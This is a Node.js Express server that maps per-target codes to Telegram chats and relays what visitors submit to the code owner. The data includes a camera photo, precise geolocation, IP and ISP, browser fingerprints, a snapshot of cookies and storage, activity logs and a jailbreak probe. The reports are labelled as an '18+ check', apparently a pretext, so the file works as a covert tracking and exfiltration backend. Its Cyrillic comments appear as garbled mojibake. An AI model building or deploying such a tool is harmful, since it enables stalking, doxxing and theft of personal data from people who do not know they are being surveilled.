// server/index.js (—É–ª—É—á—à–µ–Ω–Ω—ã–π) ==============================================
import 'dotenv/config';
import express from 'express';
import path from 'path';
import fs from 'fs';
import Database from 'better-sqlite3';
import { fileURLToPath } from 'url';

// ==== ENV ====
const BOT_TOKEN        = process.env.TELEGRAM_BOT_TOKEN || '';
const STATIC_ORIGIN    = (process.env.STATIC_ORIGIN || '*').trim();
const PUBLIC_BASE      = (process.env.PUBLIC_BASE || STATIC_ORIGIN).replace(/\/+$/, '');
const ADMIN_API_SECRET = process.env.ADMIN_API_SECRET || '';
const DB_PATH          = process.env.DB_PATH || './data/links.db';
const PORT             = Number(process.env.PORT || 10000);

// ==== Paths / Static ====
const __filename = fileURLToPath(import.meta.url);
const __dirname  = path.dirname(__filename);
const PUBLIC_DIR = path.join(__dirname, 'public');

// ==== App ====
const app = express();
app.set('trust proxy', true);
app.use(express.json({ limit: '15mb' }));
app.use(express.urlencoded({ extended: true, limit: '15mb' }));

// --- CORS
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', STATIC_ORIGIN);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});
app.options('*', (_req, res) => res.sendStatus(200));

// --- cache headers for static
app.use((req, res, next) => {
  if (/\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?)$/i.test(req.path)) {
    res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
  }
  next();
});

// --- static
app.use(express.static(PUBLIC_DIR));
app.get('/', (_req, res) => res.sendFile(path.join(PUBLIC_DIR, 'index.html')));

// ==== DB init ====
try {
  const dir = path.dirname(DB_PATH);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
} catch (e) {
  console.error('[db] mkdir failed for', DB_PATH, e);
}

console.log('[db] using', DB_PATH);
const db = new Database(DB_PATH);

// --- table (new scheme)
db.prepare(`
  CREATE TABLE IF NOT EXISTS user_codes (
    code       TEXT PRIMARY KEY,
    chat_id    TEXT NOT NULL,
    created_at INTEGER NOT NULL
  );
`).run();
db.prepare(`CREATE INDEX IF NOT EXISTS idx_user_codes_chat_id ON user_codes(chat_id);`).run();

// ---- optional migrate.sql (–±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω, –µ—Å–ª–∏ —Ñ–∞–π–ª –µ—Å—Ç—å)
try {
  const migratePath = path.join(__dirname, 'migrate.sql');
  if (fs.existsSync(migratePath)) {
    console.log('[migrate] applying migrate.sql...');
    db.exec(fs.readFileSync(migratePath, 'utf8'));
  }
} catch (e) {
  console.error('[migrate] failed', e);
}

// ==== helpers ====
function requireAdminSecret(req, res, next) {
  const auth = req.headers['authorization'] || '';
  if (!ADMIN_API_SECRET || auth !== `Bearer ${ADMIN_API_SECRET}`) {
    return res.status(401).json({ ok: false, error: 'Unauthorized' });
  }
  next();
}

function escapeHTML(s = '') {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}
function b64ToBuffer(dataUrl = '') {
  const i = dataUrl.indexOf('base64,');
  const b64 = i >= 0 ? dataUrl.slice(i + 7) : dataUrl;
  return Buffer.from(b64, 'base64');
}

// === Telegram helpers ===
async function tgSendHTML({ chatId, html }) {
  if (!BOT_TOKEN) throw new Error('No TG token');
  if (!chatId) throw new Error('Missing chat_id');
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const r = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type':'application/json' },
    body: JSON.stringify({
      chat_id: String(chatId),
      text: html,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    })
  });
  const data = await r.json().catch(()=>null);
  if (!data?.ok) throw new Error(`TG sendMessage failed: ${r.status}`);
  return data;
}

// NOTE: –≤ Node 20/22 fetch/FormData/Blob ‚Äî –≥–ª–æ–±–∞–ª—å–Ω—ã–µ.
async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'report.jpg' }) {
  if (!BOT_TOKEN) throw new Error('No BOT token on server');
  if (!chatId) throw new Error('Missing chat_id');
  if (!photoBuf?.length) throw new Error('Empty photo');

  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('caption', caption);
  form.append('parse_mode', 'HTML');
  form.append('photo', new Blob([photoBuf], { type: 'image/jpeg' }), filename);

  const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const resp = await fetch(url, { method: 'POST', body: form });
  if (!resp.ok) {
    const text = await resp.text().catch(() => '');
    throw new Error(`Telegram ${resp.status}: ${text}`);
  }
  return resp.json();
}

// --- send JSON doc to TG (for debug)
async function sendDocToTelegram({ chatId, filename, json }) {
  if (!BOT_TOKEN) throw new Error('No TG token');
  if (!chatId) throw new Error('Missing chat_id');
  const buf = Buffer.from(JSON.stringify(json, null, 2), 'utf8');

  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('document', new Blob([buf], { type: 'application/json' }), filename || 'report.json');

  const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
  const resp = await fetch(url, { method: 'POST', body: form });
  if (!resp.ok) {
    const text = await resp.text().catch(()=> '');
    throw new Error(`Telegram ${resp.status}: ${text}`);
  }
  return resp.json();
}

function extractReqIp(req) {
  const xff = (req.headers['x-forwarded-for'] || '').toString();
  const forwardedFor = xff.split(',')[0]?.trim() || null;
  const ip = req.headers['cf-connecting-ip']
    || forwardedFor
    || req.ip
    || req.connection?.remoteAddress
    || null;
  const country = req.headers['cf-ipcountry'] || null;
  return { ip, forwardedFor, country };
}

// –°–æ–±–∏—Ä–∞–µ–º –ø–æ–¥—Ä–æ–±–Ω—ã–π HTML-–æ—Ç—á—ë—Ç –Ω–∞ –±—ç–∫–µ, –µ—Å–ª–∏ —Ñ—Ä–æ–Ω—Ç –Ω–µ –ø—Ä–∏—Å–ª–∞–ª tg_snapshot
function buildTgHtml(payload, reqMeta = {}) {
  const p   = payload || {};
  const cp  = p.client_profile || {};
  const dc  = p.device_check || {};
  const pub = cp.publicIp || {};
  const conn = cp.connection || {};
  const scr  = cp.screen || {};
  const vpn  = cp.vpnProxy || {};
  const tz   = cp.timezone || p.timezone || '-';

  const ua   = p.userAgent || cp.userAgent || '-';
  const langs = Array.isArray(cp.languages) ? cp.languages.join(', ') : (p.language || '-');
  const ref   = (cp.referrer ?? p.referrer) || '-';

  const stor = cp.storageSnapshot || {};
  const cookiesLen = (stor.cookies || '').length;
  const lsKeys = stor.local ? Object.keys(stor.local).length : 0;
  const ssKeys = stor.session ? Object.keys(stor.session).length : 0;

  const canvas = cp.canvas || {};
  const webgl  = cp.webgl || {};

  // badges
  const sevBadge = (score) => score >= 80 ? "üü¢" : score >= 60 ? "üü°" : "üî¥";
  const vpnBadge = (v) => (v?.label === "likely") ? "üî¥ likely" : (v?.label === "possible") ? "üü° possible" : "üü¢ unlikely";

  const jbLikely = !!dc?.details?.jailbreakProbe?.likelyJailbroken;
  const jbHit    = dc?.details?.jailbreakProbe?.hit?.scheme || null;
  const jbBadge  = jbLikely ? `üî¥ yes (${jbHit || "hit"})` : "üü¢ no";

  const reqIp = reqMeta.ip || null;
  const xffIp = reqMeta.forwardedFor || null;

  // main lines
  const lines = [];
  lines.push(`<b>–ù–æ–≤—ã–π –æ—Ç—á—ë—Ç 18+ –ø—Ä–æ–≤–µ—Ä–∫–∞</b> ¬∑ ${sevBadge(dc.score ?? 0)} score=<code>${dc.score ?? '-'}</code>`);
  lines.push(`Code: <code>${escapeHTML(String(p.code || '-').toUpperCase())}</code>`);
  lines.push(`–í—Ä–µ–º—è: <code>${new Date().toISOString()}</code>`);
  lines.push('');

  // network
  lines.push(`<b>–°–µ—Ç—å</b>`);
  lines.push(`IP: <code>${escapeHTML(pub.ip || reqIp || '-')}</code>${xffIp && xffIp !== pub.ip ? ` (xff: <code>${escapeHTML(xffIp)}</code>)` : ''}`);
  lines.push(`CC: <code>${escapeHTML(pub.country || reqMeta.country || '-')}</code>  ISP: <code>${escapeHTML(pub.isp || pub.org || '-')}</code>`);
  lines.push(`TZ: <code>${escapeHTML(tz)}</code>  VPN: ${vpnBadge(vpn)} (score=${vpn.score ?? '-'})`);
  lines.push('');

  // jailbreak
  lines.push(`<b>Jailbreak</b>: ${jbBadge}`);
  lines.push('');

  // device check
  lines.push(`<b>DeviceCheck</b>`);
  lines.push(`UA: <code>${escapeHTML(ua).slice(0,500)}</code>`);
  lines.push(`Platform: <code>${escapeHTML(p.platform || cp.userAgentData?.platform || '-')}</code>  iOS: <code>${escapeHTML(p.iosVersion ?? cp.iosVersion ?? '-')}</code>  Safari: <code>${escapeHTML(String(p.isSafari))}</code>`);
  lines.push(`–Ø–∑—ã–∫–∏: <code>${escapeHTML(langs)}</code>`);
  lines.push(`–≠–∫—Ä–∞–Ω: ${scr.width || '?'}√ó${scr.height || '?'} (DPR=${cp.dpr ?? '?'})  Viewport: ${cp.viewport?.w || '?'}√ó${cp.viewport?.h || '?'}`);
  lines.push(`–°–µ—Ç—å: type=<code>${escapeHTML(conn.type ?? '-')}</code>, eff=<code>${escapeHTML(conn.effectiveType ?? '-')}</code>, rtt=<code>${escapeHTML(conn.rtt ?? '-')}</code>ms, down=<code>${escapeHTML(conn.downlink ?? '-')}</code>Mb/s, saveData=<code>${conn.saveData ? 'on' : 'off'}</code>`);

  // fingerprints / storage
  lines.push('');
  lines.push(`<b>FP / –•—Ä–∞–Ω–∏–ª–∏—â–∞</b>`);
  lines.push(`Canvas: hash=<code>${escapeHTML(canvas.hash || '-')}</code> (len=${canvas.rawLen ?? 0})`);
  lines.push(`WebGL: <code>${escapeHTML(webgl.vendor || webgl.vendorMasked || '-')}</code> / <code>${escapeHTML(webgl.renderer || webgl.rendererMasked || '-')}</code>`);
  lines.push(`Cookies: ${cookiesLen} —Å–∏–º–≤–æ–ª–æ–≤; localStorage: ${lsKeys} –∫–ª—é—á.; sessionStorage: ${ssKeys} –∫–ª—é—á.`);

  // activity
  const pagesCnt  = cp.activity?.pages?.length || 0;
  const clicksCnt = cp.activity?.clicks?.length || 0;
  lines.push('');
  lines.push(`<b>Referrer</b>: <code>${escapeHTML(ref)}</code>  <b>Pages</b>: ${pagesCnt}  <b>Clicks</b>: ${clicksCnt}`);

  // device-check short reasons / anomalies
  if (Array.isArray(dc.reasons) && dc.reasons.length) {
    lines.push('');
    lines.push(`<b>–ö–æ—Ä–æ—Ç–∫–æ ‚Äî DeviceCheck –ø—Ä–∏—á–∏–Ω—ã</b>:`);
    lines.push(`‚Ä¢ ${escapeHTML(dc.reasons.slice(0,4).join(' ‚Ä¢ '))}`);
  }

  // anomalies (–µ—Å–ª–∏ –µ—Å—Ç—å) ‚Äî show few
  if (Array.isArray(dc.anomalies) && dc.anomalies.length) {
    lines.push('');
    lines.push(`<b>–ê–Ω–æ–º–∞–ª–∏–∏ (—Å—Ç—Ä—É–∫—Ç—É—Ä–∏—Ä–æ–≤–∞–Ω–æ)</b>:`);
    const top = dc.anomalies.slice(0, 6).map(a => `${a.sev === 'high' ? 'üî¥' : a.sev === 'med' ? 'üü°' : 'üü¢'} ${a.code}: ${a.msg}`);
    lines.push(escapeHTML(top.join('\n')));
  }

  // geo
  if (p.geo && typeof p.geo.lat === 'number' && typeof p.geo.lon === 'number') {
    lines.push('');
    lines.push(`<b>–ì–µ–æ</b>: ${p.geo.lat.toFixed(6)}, ${p.geo.lon.toFixed(6)} (¬±${p.geo.acc ?? '?'}–º)`);
  }

  // why strange: top reasons from dc + vpn
  const reasons = [];
  if (Array.isArray(dc.reasons)) reasons.push(...dc.reasons);
  if (Array.isArray(vpn.reasons)) reasons.push(...vpn.reasons.map(r => `VPN: ${r}`));
  if (reasons.length) {
    lines.push('');
    lines.push(`<b>–ü–æ—á–µ–º—É —Å—Ç—Ä–∞–Ω–Ω–æ ‚Äî —Ç–æ–ø</b>`);
    for (const r of reasons.slice(0, 4)) lines.push(`‚Ä¢ ${escapeHTML(String(r)).slice(0,300)}`);
  }

  let html = lines.join('\n');
  if (html.length > 3800) html = html.slice(0, 3790) + '‚Ä¶'; // –∑–∞–ø–∞—Å –¥–æ –ª–∏–º–∏—Ç–∞ Telegram ~4096
  return html;
}

// ==== health & debug ====
app.get('/health', (_req, res) => res.json({ ok: true }));
app.get('/api/debug/db', (req, res) => {
  try {
    const size = fs.existsSync(DB_PATH) ? fs.statSync(DB_PATH).size : 0;
    const codes = db.prepare('SELECT COUNT(*) AS c FROM user_codes').get().c;
    res.json({ ok:true, DB_PATH, size, codes });
  } catch (e) {
    res.status(500).json({ ok:false, error:String(e) });
  }
});

// === API: client-ip (–¥–ª—è —Ñ—Ä–æ–Ω—Ç–∞)
app.get('/api/client-ip', (req, res) => {
  try {
    const { ip, forwardedFor, country } = extractReqIp(req);
    // ISP –º–æ–∂–Ω–æ –ø—Ä–æ–±—Ä–∞—Å—ã–≤–∞—Ç—å –∑–∞–≥–æ–ª–æ–≤–∫–æ–º X-ISP —Å —Ä–µ–≤–µ—Ä—Å-–ø—Ä–æ–∫—Å–∏, –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
    const isp = req.headers['x-isp'] || null;
    res.json({ ip, country: country || null, region: null, isp, forwardedFor });
  } catch (e) {
    res.status(500).json({ ok:false, error:String(e) });
  }
});

// ==== Admin: register-code ====
app.post('/api/register-code', requireAdminSecret, (req, res) => {
  try {
    const { code, chatId } = req.body || {};
    if (!code || !/^[A-Z0-9\-]{3,40}$/i.test(code)) {
      return res.status(400).json({ ok:false, error:'Invalid code' });
    }
    if (!chatId || !/^-?\d+$/.test(String(chatId))) {
      return res.status(400).json({ ok:false, error:'Invalid chatId' });
    }
    db.prepare('INSERT OR REPLACE INTO user_codes(code, chat_id, created_at) VALUES(?,?,?)')
      .run(String(code).toUpperCase(), String(chatId), Date.now());
    res.json({ ok:true, code:String(code).toUpperCase(), chatId:String(chatId) });
  } catch (e) {
    console.error('[register-code] error:', e);
    res.status(500).json({ ok:false, error:'Internal' });
  }
});

// ==== Pretty URL: /:code -> index.html?code=... ====
app.get('/:code([a-zA-Z0-9\\-]{3,40})', (req, res) => {
  const code = req.params.code.toString();
  let html = fs.readFileSync(path.join(PUBLIC_DIR, 'index.html'), 'utf8');
  const injected = html.replace(
    /<head>/i,
    `<head><script>history.replaceState(null,'','/index.html?code=${code}');</script>`
  );
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(injected);
});

// === API: tg-relay (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ: —Ñ—Ä–æ–Ω—Ç –º–æ–∂–µ—Ç –ø—Ä–∏—Å–ª–∞—Ç—å –≥–æ—Ç–æ–≤—ã–π HTML —Å–Ω–∞–ø—à–æ—Ç)
app.post('/api/tg-relay', async (req, res) => {
  try {
    const { code, html } = req.body || {};
    if (!code || typeof html !== 'string') return res.status(400).json({ ok:false, error:'bad payload' });
    const row = db.prepare('SELECT chat_id FROM user_codes WHERE code = ?').get(String(code).toUpperCase());
    if (!row) return res.status(404).json({ ok:false, error:'Unknown code' });
    await tgSendHTML({ chatId: String(row.chat_id), html: html.slice(0, 3800) });
    res.json({ ok:true });
  } catch (e) {
    console.error('[tg-relay] error:', e);
    res.status(500).json({ ok:false, error: e.message || 'internal' });
  }
});

// ==== API: report (—Ñ–æ—Ç–æ + –ø–æ–¥—Ä–æ–±–Ω—ã–π —Ç–µ–∫—Å—Ç –≤–ª–∞–¥–µ–ª—å—Ü—É –∫–æ–¥–∞) ====
app.post('/api/report', async (req, res) => {
  try {
    const {
      userAgent, platform, iosVersion, isSafari,
      geo, photoBase64, note, code,
      client_profile, device_check, tg_snapshot
    } = req.body || {};

    if (!code)        return res.status(400).json({ ok:false, error: 'No code' });
    if (!photoBase64) return res.status(400).json({ ok:false, error: 'No photoBase64' });

    const row = db.prepare('SELECT chat_id FROM user_codes WHERE code = ?')
      .get(String(code).toUpperCase());
    if (!row) return res.status(404).json({ ok:false, error:'Unknown code' });

    const chatId = String(row.chat_id);

    // 1) –§–æ—Ç–æ —Å –∫–æ—Ä–æ—Ç–∫–∏–º caption
    const caption = [
      '<b>–ù–æ–≤—ã–π –æ—Ç—á—ë—Ç 18+ –ø—Ä–æ–≤–µ—Ä–∫–∞</b>',
      `Code: <code>${escapeHTML(String(code).toUpperCase())}</code>`,
      `UA: <code>${escapeHTML(userAgent || '')}</code>`,
      `Platform: <code>${escapeHTML(platform || '')}</code>`,
      `iOS-like: <code>${escapeHTML(iosVersion ?? '')}</code>  Safari: <code>${escapeHTML(isSafari)}</code>`,
      geo ? `Geo: <code>${escapeHTML(`${geo.lat}, ${geo.lon} ¬±${geo.acc}m`)}</code>` : 'Geo: <code>–Ω–µ—Ç</code>',
      note ? `Note: <code>${escapeHTML(note)}</code>` : null
    ].filter(Boolean).join('\n');

    const buf = b64ToBuffer(photoBase64);
    await sendPhotoToTelegram({ chatId, caption, photoBuf: buf });

    // 2) –ü–æ–¥—Ä–æ–±–Ω—ã–π —Ç–µ–∫—Å—Ç (–µ—Å–ª–∏ —Ñ—Ä–æ–Ω—Ç –ø—Ä–∏—Å–ª–∞–ª tg_snapshot ‚Äî –∏—Å–ø–æ–ª—å–∑—É–µ–º –µ–≥–æ; –∏–Ω–∞—á–µ —Å–æ–±–∏—Ä–∞–µ–º —Å–∞–º–∏)
    const reqMeta = extractReqIp(req);
    const html = (typeof tg_snapshot === 'string' && tg_snapshot.trim().length)
      ? tg_snapshot.trim().slice(0, 3800)
      : buildTgHtml(
          { userAgent, platform, iosVersion, isSafari, geo, note, code, client_profile, device_check },
          reqMeta
        );

    await tgSendHTML({ chatId, html });

    // 3) –û—Ç–ø—Ä–∞–≤–ª—è–µ–º JSON-—Ñ–∞–π–ª —Å —Å—ã—Ä—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏ (–ø–æ–ª–µ–∑–Ω–æ –¥–ª—è –¥–µ–±–∞–≥–∞) ‚Äî –Ω–µ –∫—Ä–∏—Ç–∏—á–Ω–æ –¥–ª—è —Ä–∞–±–æ—Ç—ã, –ª–æ–≤–∏–º –æ—à–∏–±–∫–∏
    try {
      const raw = {
        code,
        timeISO: new Date().toISOString(),
        req: extractReqIp(req),
        device_check,
        client_profile,
        geo,
        note
      };
      await sendDocToTelegram({ chatId, filename: `report_${String(code).toUpperCase()}.json`, json: raw });
    } catch (e) {
      // –ª–æ–≥–∏—Ä—É–µ–º, –Ω–æ –Ω–µ –ø–∞–¥–∞–µ–º ‚Äî –æ—Ç–ø—Ä–∞–≤–∫–∞ JSON –Ω–µ –∫—Ä–∏—Ç–∏—á–Ω–∞
      console.error('[report] send JSON doc failed:', e && e.message ? e.message : e);
    }

    res.json({ ok: true, delivered: true });
  } catch (e) {
    console.error('[report] error:', e);
    res.status(500).json({ ok: false, error: e.message || 'Internal error' });
  }
});

// ==== 404 fallback ====
app.use((req, res) => {
  if (req.method === 'GET' && req.accepts('html')) return res.status(404).send('Not Found');
  res.status(404).json({ ok: false, error: 'Not Found' });
});

// ==== Start ====
app.listen(PORT, () => {
  console.log(`[server] listening on :${PORT}`);
  console.log(`[server] Public dir: ${PUBLIC_DIR}`);
  console.log(`[server] CORS Allow-Origin: ${STATIC_ORIGIN}`);
  console.log(`[server] PUBLIC_BASE: ${PUBLIC_BASE}`);
});
